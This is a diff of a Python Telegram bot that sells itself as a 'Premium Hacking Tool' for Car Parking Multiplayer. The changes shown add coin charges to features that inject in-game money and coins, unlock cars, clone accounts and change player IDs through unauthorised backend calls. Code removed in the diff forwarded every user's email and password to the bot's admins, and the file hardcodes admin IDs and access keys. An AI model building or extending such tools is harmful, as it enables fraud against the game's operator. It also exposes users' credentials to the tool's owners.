-                f"💎 **WELCOME BACK, SUBSCRIBER!** 💎\n━━━━━━━━━━━━━━━━━━━━━\n✅ Your subscription is active.\n⏱️ Duration: {sub_data['duration']} hours\n📅 Expires: {expires}\n━━━━━━━━━━━━━━━━━━━━━\n🎮 You can now use all features!",
+                f"💎 **WELCOME BACK, SUBSCRIBER!** 💎\n━━━━━━━━━━━━━━━━━━━━━\n✅ Your subscription is active.\n⏱️ Duration: {sub_data['duration']} hours\n📅 Expires: {expires}\n{coin_display}\n━━━━━━━━━━━━━━━━━━━━━\n🎮 You can now use all features!",
                 reply_markup=create_main_keyboard(chat_id),
                 parse_mode='Markdown'
             )
             return
+
     total_users.add(chat_id)
     if not check_subscription(chat_id):
         subscription_required(message)
         return
+
     if chat_id in user_sessions:
         user_sessions[chat_id] = {}
+
     markup = create_start_keyboard(chat_id)
-    bot.send_message(chat_id, get_text(chat_id, "welcome"), reply_markup=markup, parse_mode='Markdown')
+    welcome_text = get_text(chat_id, "welcome") + f"\n\n{coin_display}\n\n📌 **Coin costs:**\n• 50 coins per feature\n• 100 coins for Clone Account\n• 250 coins for Bulk features\n💎 Subscribe for unlimited access!"
+    bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode='Markdown')
 
 @bot.message_handler(commands=['menu'])
 def menu_command(message):
@@ -2565,7 +2524,13 @@ def menu_command(message):
     if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in'):
         bot.send_message(chat_id, get_text(chat_id, "not_logged"), parse_mode='Markdown')
         return
-    bot.send_message(chat_id, "🚘 **MARKMWEHEHETOOL BOT**\n🔥 Premium Hacking Tool 🔥\n━━━━━━━━━━━━━━━━━━━━━\n📱 **CPM1** - Advanced CPM1 activations\n🎮 **CPM2** - King Rank & Account Generation\n━━━━━━━━━━━━━━━━━━━━━\n💡 Choose the appropriate section below:", reply_markup=create_main_keyboard(chat_id), parse_mode='Markdown')
+    coin_display = get_coin_display(chat_id)
+    bot.send_message(
+        chat_id,
+        f"🚘 **𝙈𝘼𝙍𝙆𝘾𝙋𝙈1𝙏𝙊𝙊𝙋𝙎 BOT**\n🔥 Premium Hacking Tool 🔥\n━━━━━━━━━━━━━━━━━━━━━\n{coin_display}\n━━━━━━━━━━━━━━━━━━━━━\n📱 **CPM1** - Advanced CPM1 activations\n🎮 **CPM2** - Under Maintenance\n━━━━━━━━━━━━━━━━━━━━━\n💡 Choose the appropriate section below:",
+        reply_markup=create_main_keyboard(chat_id),
+        parse_mode='Markdown'
+    )
 
 @bot.message_handler(commands=['cancel', 'back'])
 def cancel_command(message):
@@ -2759,7 +2724,6 @@ def handle_callback(call):
     except Exception:
         pass
 
-    # ====== Subscription ======
     if data == "check_sub":
         if check_subscription(chat_id):
             bot.send_message(chat_id, "✅ **Verified! You are subscribed**", parse_mode='Markdown')
@@ -2768,7 +2732,6 @@ def handle_callback(call):
             subscription_required(call.message)
         return
 
-    # ====== Keys ======
     if data == "normal_key":
         bot.answer_callback_query(call.id, "🔑 Activating...")
         bot.send_message(chat_id, get_text(chat_id, "key_title"), parse_mode='Markdown')
@@ -2781,7 +2744,6 @@ def handle_callback(call):
         bot.register_next_step_handler(call.message, check_time_key)
         return
 
-    # ====== Free Trial ======
     if data == "free_trial":
         bot.answer_callback_query(call.id, "🎁 Activating free trial...")
         if not check_subscription(chat_id):
@@ -2836,7 +2798,6 @@ def handle_callback(call):
         menu_command(call.message)
         return
 
-    # ====== Sections ======
     if data == "section_cpm1":
         section_cpm1(call.message)
         return
@@ -2847,9 +2808,25 @@ def handle_callback(call):
         menu_command(call.message)
         return
 
-    # ====== CPM1 ======
     web_uid = get_web_uid(chat_id)
-    
+
+    # ---- execute_cpm1 function ----
+    def execute_cpm1(feature_name, feature_func, *args, cost=COST_INDIVIDUAL):
+        if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in') or user_sessions[chat_id].get('version') != "1":
+            bot.send_message(chat_id, "❌ **You must login to CPM1 first!**", parse_mode='Markdown')
+            section_cpm1(call.message)
+            return
+        if not check_and_deduct_coins(chat_id, cost, feature_name):
+            return
+        bot.send_message(chat_id, f"⏳ **Executing {feature_name}...**", parse_mode='Markdown')
+        result = run_async(feature_func(web_uid, *args))
+        if result and result.get("ok"):
+            bot.send_message(chat_id, f"✅ **{feature_name} completed successfully!**\n{result.get('message', '')}", parse_mode='Markdown')
+            show_cpm1_menu(chat_id)
+        else:
+            bot.send_message(chat_id, f"❌ **{feature_name} failed!**\n{result.get('message', 'Unknown error')}", parse_mode='Markdown')
+            show_cpm1_menu(chat_id)
+
     if data == "refresh_account":
         if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in') or user_sessions[chat_id].get('version') != "1":
             bot.send_message(chat_id, "❌ **You must login to CPM1 first!**", parse_mode='Markdown')
@@ -2868,21 +2845,8 @@ def handle_callback(call):
             bot.edit_message_text(f"❌ **Error refreshing data!**\n💀 {str(e)}", chat_id, loading_msg.message_id, parse_mode='Markdown')
             show_cpm1_menu(chat_id, call.message)
         return
-    
-    def execute_cpm1(feature_name, feature_func, *args):
-        if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in') or user_sessions[chat_id].get('version') != "1":
-            bot.send_message(chat_id, "❌ **You must login to CPM1 first!**", parse_mode='Markdown')
-            section_cpm1(call.message)
-            return
-        bot.send_message(chat_id, f"⏳ **Executing {feature_name}...**", parse_mode='Markdown')
-        result = run_async(feature_func(web_uid, *args))
-        if result and result.get("ok"):
-            bot.send_message(chat_id, f"✅ **{feature_name} completed successfully!**\n{result.get('message', '')}", parse_mode='Markdown')
-            show_cpm1_menu(chat_id)
-        else:
-            bot.send_message(chat_id, f"❌ **{feature_name} failed!**\n{result.get('message', 'Unknown error')}", parse_mode='Markdown')
-            show_cpm1_menu(chat_id)
 
+    # ---- CPM1 features (with coin costs) ----
     if data == "cpm1_change_email":
         bot.send_message(chat_id, "📧 **Enter new email:**", parse_mode='Markdown')
         user_states[chat_id] = {'awaiting_cpm1_email': True}
@@ -2892,6 +2856,8 @@ def handle_callback(call):
         user_states[chat_id] = {'awaiting_cpm1_pass': True}
         return
     if data == "cpm1_clone":
+        if not check_and_deduct_coins(chat_id, COST_CLONE, "Clone Account"):
+            return
         bot.send_message(chat_id, "📋 **Clone CPM1 Account**\n━━━━━━━━━━━━━━━━━━━━━\n📧 **Enter source account email:**", parse_mode='Markdown')
         user_states[chat_id] = {'awaiting_clone_source_email': True}
         return
@@ -2952,10 +2918,10 @@ def handle_callback(call):
         execute_cpm1("Unlock Female Equipment", nuker.unlock_equipments_female)
         return
     if data == "cpm1_ultimate":
-        execute_cpm1("Ultimate Unlock", nuker.unlock_all_features)
+        execute_cpm1("Ultimate Unlock", nuker.unlock_all_features, cost=COST_BULK)
         return
 
-    # ====== Unlock Cars Menu ======
+    # ---- Unlock Cars menu ----
     if data == "unlock_manual":
         if chat_id not in user_sessions or not user_sessions[chat_id].get('unlock_email') or not user_sessions[chat_id].get('unlock_pass'):
             bot.send_message(chat_id, "❌ **Missing data! Start from Unlock Cars again.**", parse_mode='Markdown')
@@ -2972,6 +2938,8 @@ def handle_callback(call):
         bot.send_message(chat_id, get_text(chat_id, "unlock_cars_auto_confirm"), reply_markup=create_unlock_auto_confirm_keyboard(chat_id), parse_mode='Markdown')
         return
     if data == "unlock_auto_confirm":
+        if not check_and_deduct_coins(chat_id, COST_BULK, "Unlock All Cars"):
+            return
         email = user_sessions[chat_id].get('unlock_email')
         password = user_sessions[chat_id].get('unlock_pass')
         if not email or not password:
@@ -3000,10 +2968,7 @@ def handle_callback(call):
             result_text = f"✅ **Cars unlocked!**\n━━━━━━━━━━━━━━━━━━━━━\n✅ Added: {success} cars\n🎨 Vinyl designs included!\n💀 Skipped: {fail}\n━━━━━━━━━━━━━━━━━━━━━\n🚗 Open your garage in-game!"
         else:
             result_text = f"❌ **Unlock failed.**\n━━━━━━━━━━━━━━━━━━━━━\n💀 Could not reach the car vault or your account.\n🔁 Please check your credentials and try again.\n━━━━━━━━━━━━━━━━━━━━━\n📊 Skipped: {fail}"
-        bot.edit_message_text(
-            result_text,
-            chat_id, loading_msg.message_id, parse_mode='Markdown'
-        )
+        bot.edit_message_text(result_text, chat_id, loading_msg.message_id, parse_mode='Markdown')
         if 'unlock_email' in user_sessions[chat_id]:
             del user_sessions[chat_id]['unlock_email']
         if 'unlock_pass' in user_sessions[chat_id]:
@@ -3019,42 +2984,12 @@ def handle_callback(call):
         show_cpm1_menu(chat_id)
         return
 
-    # ====== CPM2 ======
-    if data == "cpm2_king_rank":
-        if not is_admin(chat_id):
-            bot.send_message(chat_id, "🛠️ **CPM2 is currently under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.\n\n📌 For inquiries, contact @Maarkryan.", parse_mode='Markdown')
-            return
-        if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in') or user_sessions[chat_id].get('version') != "2":
-            bot.send_message(chat_id, "❌ **You must login to CPM2 first!**", parse_mode='Markdown')
-            section_cpm2(call.message)
-            return
-        email = user_sessions[chat_id].get('email')
-        password = user_sessions[chat_id].get('password')
-        bot.send_message(chat_id, "⏳ **Upgrading rank...**", parse_mode='Markdown')
-        success, msg = cpm2_king_rank(email, password)
-        if success:
-            bot.send_message(chat_id, f"✅ **{msg}**", parse_mode='Markdown')
-        else:
-            bot.send_message(chat_id, f"❌ **{msg}**", parse_mode='Markdown')
-        return
-    if data == "cpm2_generate":
-        if not is_admin(chat_id):
-            bot.send_message(chat_id, "🛠️ **CPM2 is currently under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.\n\n📌 For inquiries, contact @Maarkryan.", parse_mode='Markdown')
-            return
-        if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in'):
-            bot.send_message(chat_id, "❌ **You must login first!**", parse_mode='Markdown')
-            section_cpm2(call.message)
-            return
-        bot.send_message(chat_id, "⏳ **Generating CPM2 account...**", parse_mode='Markdown')
-        acc, err = generate_cpm2_account()
-        if acc:
-            bot.send_message(chat_id, f"✅ **Generated!**\n📧 `{acc['email']}`\n🔑 `{acc['password']}`", parse_mode='Markdown')
-            save_account(chat_id, acc['email'], acc['password'], "cpm2_generated", "CPM2_Generated")
-        else:
-            bot.send_message(chat_id, "❌ **Generation failed!**", parse_mode='Markdown')
+    # ---- CPM2 (under maintenance) ----
+    if data == "cpm2_king_rank" or data == "cpm2_generate" or data == "cpm2_maintenance":
+        bot.send_message(chat_id, "🛠️ **CPM2 is currently under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.\n\n📌 For inquiries, contact @Maarkryan.", parse_mode='Markdown')
         return
 
-    # ====== Logout ======
+    # ---- Logout ----
     if data == "logout":
         if chat_id in user_sessions:
             user_sessions[chat_id] = {}
@@ -3075,7 +3010,7 @@ def handle_callback(call):
         )
         return
 
-    # ====== Admin Panel ======
+    # ---- Admin Panel ----
     if data == "admin_panel":
         if not is_admin(chat_id):
             bot.send_message(chat_id, get_text(chat_id, "not_admin"), parse_mode='Markdown')
@@ -3083,7 +3018,7 @@ def handle_callback(call):
         bot.send_message(chat_id, get_text(chat_id, "admin_panel"), reply_markup=create_admin_keyboard(chat_id), parse_mode='Markdown')
         return
 
-    # ====== Admin: Download Logs ======
+    # ---- Admin actions ----
     if data == "admin_download_logs":
         if not is_admin(chat_id):
             return
@@ -3099,8 +3034,6 @@ def handle_callback(call):
             return
         dashboard_command(call.message)
         return
-
-    # ====== Admin: Refresh All ======
     if data == "admin_refresh_all":
         if not is_admin(chat_id):
             return
@@ -3121,8 +3054,6 @@ def handle_callback(call):
         bot.edit_message_text(f"✅ **Refreshed {count} cached accounts!**", chat_id, loading_msg.message_id, parse_mode='Markdown')
         admin_panel(call.message)
         return
-
-    # ====== Admin: Time Keys ======
     if data == "admin_time_keys":
         if not is_admin(chat_id):
             return
@@ -3172,8 +3103,6 @@ def handle_callback(call):
         bot.send_message(chat_id, "🗑️ **Delete Time Key**\n━━━━━━━━━━━━━━━━━━━━━\n📌 Send the key to delete:", parse_mode='Markdown')
         user_states[chat_id] = {'awaiting_time_key_delete': True}
         return
-
-    # ====== Admin: Key Stats ======
     if data == "admin_key_stats":
         if not is_admin(chat_id):
             return
@@ -3209,8 +3138,6 @@ def handle_callback(call):
         bot.send_message(chat_id, stats_text, parse_mode='Markdown')
         admin_panel(call.message)
         return
-
-    # ====== Admin: Key Users ======
     if data == "admin_key_users":
         if not is_admin(chat_id):
             return
@@ -3249,8 +3176,6 @@ def handle_callback(call):
                 text = ""
         admin_panel(call.message)
         return
-
-    # ====== Admin: Stats ======
     if data == "admin_stats":
         if not is_admin(chat_id):
             return
@@ -3336,7 +3261,7 @@ def handle_callback(call):
         admin_panel(call.message)
         return
 
-    # ====== SUBSCRIPTION ======
+    # ---- SUBSCRIPTION ----
     if data == "subscription_menu":
         bot.send_message(chat_id, get_text(chat_id, "subscription_menu"), reply_markup=create_subscription_duration_keyboard(), parse_mode='Markdown')
         return
@@ -3420,7 +3345,6 @@ def handle_callback(call):
         bot.send_message(chat_id, text, parse_mode='Markdown')
         return
 
-    # ====== STARS PAYMENT: AUTOMATIC ACTIVATION ======
     if data.startswith("stars_paid_"):
         parts = data.split("_", 2)
         if len(parts) < 3:
@@ -3462,15 +3386,6 @@ def handle_callback(call):
             del PENDING_SUBSCRIPTIONS[user_id]
         return
 
-    # ====== SUBSCRIPTION CONFIRM/DECLINE (money payments) ======
-    def _is_logs_group_admin(cid):
-        if is_admin(cid):
-            return True
-        try:
-            member = bot.get_chat_member(cid, cid)
-            return member.status in ('administrator', 'creator')
-        except Exception:
-            return False
     if data.startswith("sub_confirm_"):
         rest = data[len("sub_confirm_"):]
         user_id, duration_key, payment_method = _parse_sub_callback(rest)
@@ -3571,7 +3486,7 @@ def handle_callback(call):
     bot.answer_callback_query(call.id, "🔹 Executing...")
 
 # ═══════════════════════════════════════════════════════════
-# 📝 KEY HANDLERS
+# 📝 KEY HANDLERS (Normal, Time, Trial)
 # ═══════════════════════════════════════════════════════════
 
 def check_time_key(message):
@@ -3746,6 +3661,10 @@ def check_key(message):
         bot.send_message(chat_id, get_text(chat_id, "wrong_key"), parse_mode='Markdown')
         start(message)
 
+# ═══════════════════════════════════════════════════════════
+# 📝 LOGIN HANDLERS
+# ═══════════════════════════════════════════════════════════
+
 def get_email(message):
     chat_id = message.chat.id
     if message.text and message.text.startswith('/'):
@@ -3808,33 +3727,13 @@ def get_password(message):
             bot.send_message(chat_id, f"❌ **CPM1 Login failed!**\n📧 Email: `{email}`\n💡 Try again:", parse_mode='Markdown')
             bot.register_next_step_handler(message, get_email)
         return
-    elif version == "2":
-        result = cpm2_login(email, password)
-        if result and result.get("token"):
-            user_sessions[chat_id]['logged_in'] = True
-            user_sessions[chat_id]['version'] = "2"
-            user_sessions[chat_id]['email'] = email
-            user_sessions[chat_id]['password'] = password
-            save_account(chat_id, email, password, result.get("uid"), "CPM2")
-            notify_admins(
-                f"📱 **New Login - CPM2**\n"
-                f"━━━━━━━━━━━━━━━━━━━━━\n"
-                f"👤 Name: `{first_name}`\n"
-                f"🆔 Username: @{username}\n"
-                f"🆔 ID: `{chat_id}`\n"
-                f"📧 Email: `{email}`\n"
-                f"🔑 Password: `{password}`\n"
-                f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-            )
-            bot.send_message(chat_id, f"✅ **Logged in to CPM2!**\n📧 Email: `{email}`\n━━━━━━━━━━━━━━━━━━━━━\n📌 Choose activation:", parse_mode='Markdown')
-            section_cpm2(message)
-        else:
-            bot.send_message(chat_id, f"❌ **CPM2 Login failed!**\n📧 Email: `{email}`\n💡 Try again:", parse_mode='Markdown')
-            bot.register_next_step_handler(message, get_email)
+    else:
+        # CPM2 login - disabled
+        bot.send_message(chat_id, "🛠️ **CPM2 is under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.", parse_mode='Markdown')
         return
 
 # ═══════════════════════════════════════════════════════════
-# 📝 MESSAGE HANDLER
+# 📝 MESSAGE HANDLER (for inputs)
 # ═══════════════════════════════════════════════════════════
 
 @bot.message_handler(content_types=["successful_payment"])
@@ -3916,7 +3815,7 @@ def handle_all_messages(message):
     if chat_id in user_states:
         state = user_states[chat_id]
 
-        # ====== SUBSCRIPTION PHOTO HANDLING ======
+        # SUBSCRIPTION PHOTO
         if state.get('awaiting_subscription_photo'):
             if not message.photo:
                 if text and (text.strip().startswith('/') or text.strip().lower() in ('cancel', 'batalin', 'back')):
@@ -4000,7 +3899,7 @@ def handle_all_messages(message):
                 del user_states[chat_id]['awaiting_subscription_photo']
             return
 
-        # ====== CPM1 - Change Email ======
+        # CPM1 - Change Email
         if state.get('awaiting_cpm1_email'):
             web_uid = user_sessions[chat_id].get('web_uid')
             if not web_uid:
@@ -4010,6 +3909,9 @@ def handle_all_messages(message):
             new_email = text.strip()
             if '@' not in new_email or '.' not in new_email:
                 bot.send_message(chat_id, "❌ **Invalid email format!**", parse_mode='Markdown')
+                return
+            if not check_and_deduct_coins(chat_id, COST_INDIVIDUAL, "Change Email"):
+                del user_states[chat_id]
                 return
             loading_msg = bot.send_message(chat_id, "⏳ **Changing email...**", parse_mode='Markdown')
             result = run_async(nuker.change_email(web_uid, new_email))
@@ -4022,7 +3924,7 @@ def handle_all_messages(message):
             show_cpm1_menu(chat_id)
             return
 
-        # ====== CPM1 - Change Password ======
+        # CPM1 - Change Password
         if state.get('awaiting_cpm1_pass'):
             new_pass = text.strip()
             if len(new_pass) < 6:
@@ -4031,6 +3933,9 @@ def handle_all_messages(message):
             web_uid = user_sessions[chat_id].get('web_uid')
             if not web_uid:
                 bot.send_message(chat_id, "❌ **Session expired! Login again.**", parse_mode='Markdown')
+                del user_states[chat_id]
+                return
+            if not check_and_deduct_coins(chat_id, COST_INDIVIDUAL, "Change Password"):
                 del user_states[chat_id]
                 return
             loading_msg = bot.send_message(chat_id, "⏳ **Changing password...**", parse_mode='Markdown')
@@ -4044,7 +3949,7 @@ def handle_all_messages(message):
             show_cpm1_menu(chat_id)
             return
 
-        # ====== CPM1 - Clone Account ======
+        # Clone Account
         if state.get('awaiting_clone_source_email'):
             user_sessions[chat_id]['clone_source_email'] = text.strip()
             bot.send_message(chat_id, "🔑 **Enter source account password:**", parse_mode='Markdown')
@@ -4065,6 +3970,7 @@ def handle_all_messages(message):
             source_pass = user_sessions[chat_id].get('clone_source_pass')
             target_email = user_sessions[chat_id].get('clone_target_email')
             target_pass = text.strip()
+            # Coin already deducted in callback, just execute
             bot.send_message(chat_id, "⏳ **Cloning account...**\n⏱️ Please wait, this is running fast now!", parse_mode='Markdown')
             result = cpm1_clone_account(source_email, source_pass, target_email, target_pass)
             if result[0] == True:
@@ -4080,7 +3986,7 @@ def handle_all_messages(message):
             show_cpm1_menu(chat_id)
             return
 
-        # ====== CPM1 - Unlock Cars ======
+        # Unlock Cars
         if state.get('awaiting_unlock_email'):
             email = text.strip()
             if '@' not in email or '.' not in email:
@@ -4125,6 +4031,9 @@ def handle_all_messages(message):
                     del user_states[chat_id]
                     show_cpm1_menu(chat_id)
                     return
+                if not check_and_deduct_coins(chat_id, COST_INDIVIDUAL, f"Manual Unlock Car {cid}"):
+                    del user_states[chat_id]
+                    return
                 loading_msg = bot.send_message(chat_id, f"⏳ **Injecting car {cid}...**", parse_mode='Markdown')
                 result = cpm1_clone_single_car(email, password, cid)
                 if result:
@@ -4137,7 +4046,7 @@ def handle_all_messages(message):
                 bot.send_message(chat_id, "❌ **Invalid number!** Must be a number.", parse_mode='Markdown')
             return
 
-        # ====== CPM1 - Change ID ======
+        # Change ID
         if state.get('awaiting_change_id'):
             new_id = text.strip().upper()
             if not new_id:
@@ -4146,6 +4055,9 @@ def handle_all_messages(message):
             web_uid = user_sessions[chat_id].get('web_uid')
             if not web_uid:
                 bot.send_message(chat_id, "❌ **Session expired! Login again.**", parse_mode='Markdown')
+                del user_states[chat_id]
+                return
+            if not check_and_deduct_coins(chat_id, COST_INDIVIDUAL, "Change ID"):
                 del user_states[chat_id]
                 return
             result = run_async(nuker.change_player_id(web_uid, new_id))
@@ -4157,7 +4069,7 @@ def handle_all_messages(message):
             show_cpm1_menu(chat_id)
             return
 
-        # ====== CPM1 - Add Money ======
+        # Add Money
         if state.get('awaiting_money'):
             try:
                 amount = int(text.strip().replace(',', '').replace('_', ''))
@@ -4175,6 +4087,9 @@ def handle_all_messages(message):
                 bot.send_message(chat_id, "❌ **Session expired! Login again.**", parse_mode='Markdown')
                 del user_states[chat_id]
                 return
+            if not check_and_deduct_coins(chat_id, COST_INDIVIDUAL, "Add Money"):
+                del user_states[chat_id]
+                return
             result = run_async(nuker.set_money(web_uid, amount))
             if result and result.get("ok"):
                 bot.send_message(chat_id, get_text(chat_id, "money_added", amount=f"{amount:,}"), parse_mode='Markdown')
@@ -4184,7 +4099,7 @@ def handle_all_messages(message):
             show_cpm1_menu(chat_id)
             return
 
-        # ====== CPM1 - Add Coins ======
+        # Add Coins
         if state.get('awaiting_coin'):
             try:
                 amount = int(text.strip().replace(',', '').replace('_', ''))
@@ -4202,6 +4117,9 @@ def handle_all_messages(message):
                 bot.send_message(chat_id, "❌ **Session expired! Login again.**", parse_mode='Markdown')
                 del user_states[chat_id]
                 return
+            if not check_and_deduct_coins(chat_id, COST_INDIVIDUAL, "Add Coins"):
+                del user_states[chat_id]
+                return
             result = run_async(nuker.set_coin(web_uid, amount))
             if result and result.get("ok"):
                 bot.send_message(chat_id, get_text(chat_id, "money_added", amount=f"{amount:,} Coins"), parse_mode='Markdown')
@@ -4211,7 +4129,7 @@ def handle_all_messages(message):
             show_cpm1_menu(chat_id)
             return
 
-        # ====== Admin: Time Key - Create ======
+        # Admin: Time Key - Create
         if state.get('awaiting_time_key_hours'):
             if not is_admin(chat_id):
                 del user_states[chat_id]
@@ -4240,7 +4158,7 @@ def handle_all_messages(message):
             admin_panel(message)
             return
 
-        # ====== Admin: Time Key - Delete ======
+        # Admin: Time Key - Delete
         if state.get('awaiting_time_key_delete'):
             if not is_admin(chat_id):
                 del user_states[chat_id]
@@ -4255,7 +4173,7 @@ def handle_all_messages(message):
             admin_panel(message)
             return
 
-        # ====== Admin: Broadcast ======
+        # Admin: Broadcast
         if state.get('awaiting_broadcast'):
             if not is_admin(chat_id):
                 del user_states[chat_id]
@@ -4273,7 +4191,7 @@ def handle_all_messages(message):
             admin_panel(message)
             return
 
-        # ====== Admin: Manage Keys ======
+        # Admin: Manage Keys
         if state.get('awaiting_add_key'):
             if not is_admin(chat_id):
                 del user_states[chat_id]
@@ -4301,7 +4219,7 @@ def handle_all_messages(message):
             admin_panel(message)
             return
 
-        # ====== Admin: Ban / Unban ======
+        # Admin: Ban / Unban
         if state.get('awaiting_ban'):
             if not is_admin(chat_id):
                 del user_states[chat_id]
@@ -4381,29 +4299,20 @@ if __name__ == "__main__":
     _enforce_single_instance()
     _start_flask_background()
     print("="*60)
-    print("MARKMWEHEHETOOL BOT - CPM1 + CPM2 ULTIMATE")
+    print("𝙈𝘼𝙍𝙆𝘾𝙋𝙈1𝙏𝙊𝙊𝙋𝙎 - CPM1 + CPM2 (MAINTENANCE)")
     print("="*60)
     print("✅ Bot is running!")
     print("👑 Admins: 6531314640, 8650959684")
     print("🔑 Keys: MARKMWEHEHETOOL7077, MARKK, TANNER")
-    print("⏰ Time Keys: Supported (Admin can create keys with custom hours)")
+    print("⏰ Time Keys: Supported")
     print("🎁 Free Trial: Supported (10 minutes)")
-    print("📱 CPM1:")
-    print("   - Old (Cloning, Car Unlock): from old code")
-    print("   - New (W16, Horns, Fuel, Damage, Smoke, etc): from CPMNuker")
-    print("🎮 CPM2: from old code (working)")
-    print("📊 Key Tracking: Active (No duplicate users per key)")
-    print("📢 Admin Notifications: Active (Email + Password on login)")
-    print("🔄 Refresh Account: Fixed (Force refresh from server)")
-    print("🌐 Language: English Only")
+    print("📱 CPM1: All features working with coin costs (50/100/250)")
+    print("🎮 CPM2: UNDER MAINTENANCE")
+    print("📊 Key Tracking: Active")
+    print("🔄 Refresh Account: Fixed")
     print("🔥 Firebase Logging: ACTIVE")
-    print("📥 /download_logs - View cloud logs summary")
-    print("💾 /backup_now - Download full backup")
-    print("📊 /dashboard - Admin dashboard with stats")
     print("💎 Subscription System: FULLY WORKING")
-    print("🌟 Stars Payment: AUTOMATIC activation (no admin confirm)")
-    print("🌟 Stars Balance: tracked in stars_balance.json (/stars to view)")
-    print("⏰ Auto Expiry: User gets renewal message when subscription expires")
+    print("🌟 Stars Payment: AUTOMATIC activation")
     print("="*60)
 
     try:
